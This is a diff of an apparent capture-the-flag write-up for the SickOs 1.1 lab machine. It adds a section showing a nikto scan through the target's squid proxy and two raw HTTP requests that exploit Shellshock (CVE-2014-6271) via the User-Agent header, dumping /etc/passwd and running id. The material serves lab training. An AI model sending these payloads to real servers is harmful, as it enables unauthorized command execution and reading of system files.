@@ -1,7 +1,5 @@
 ### slickOs 1.1
 
-## 1. Emmu
-
 Netscan
 ```
 nmap -sn 192.168.174.0/24
@@ -210,3 +208,122 @@ Thanks for Trying
 
 
 got it :)
+
+
+
+
+## other way to www-data (shellshock)
+
+```
+nikto -h 192.168.174.133 -useproxy 192.168.174.133:3128
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.174.133
++ Target Hostname:    192.168.174.133
++ Target Port:        80
++ Proxy:              192.168.174.133:3128
++ Start Time:         2016-01-05 11:11:01 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Retrieved via header: 1.0 localhost (squid/3.1.19)
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'x-cache' found, with contents: MISS from localhost
++ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec  5 01:35:02 2015
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
++ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_REQ 0
++ Uncommon header 'nikto-added-cve-2014-6271' found, with contents: true
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3093: /.bash_history: A user's home directory may be set to the web root, the shell history was retrieved. This should not be accessible via the web.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8347 requests: 0 error(s) and 22 item(s) reported on remote host
++ End Time:           2016-01-05 11:11:22 (GMT1) (21 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+```
+
+test shellshock (read /etc/passwd)
+```
+GET http://192.168.174.133/cgi-bin/status HTTP/1.1
+Host: 192.168.174.133
+User-Agent: () { :; }; echo; /bin/cat /etc/passwd
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=grvc7rgk8qqdqoqvalcpqmsh35
+Connection: close
+
+
+HTTP/1.0 200 OK
+Date: Tue, 05 Jan 2016 11:30:43 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Cache: MISS from localhost
+X-Cache-Lookup: MISS from localhost:3128
+Via: 1.0 localhost (squid/3.1.19)
+Connection: close
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+Check User
+```
+GET http://192.168.174.133/cgi-bin/status HTTP/1.1
+Host: 192.168.174.133
+User-Agent: () { :; }; echo; /usr/bin/id
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=grvc7rgk8qqdqoqvalcpqmsh35
+Connection: close
+
+HTTP/1.0 200 OK
+Date: Tue, 05 Jan 2016 11:33:32 GMT
+Server: Apache/2.2.22 (Ubuntu)
+X-Cache: MISS from localhost
+X-Cache-Lookup: MISS from localhost:3128
+Via: 1.0 localhost (squid/3.1.19)
+Connection: close
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+...
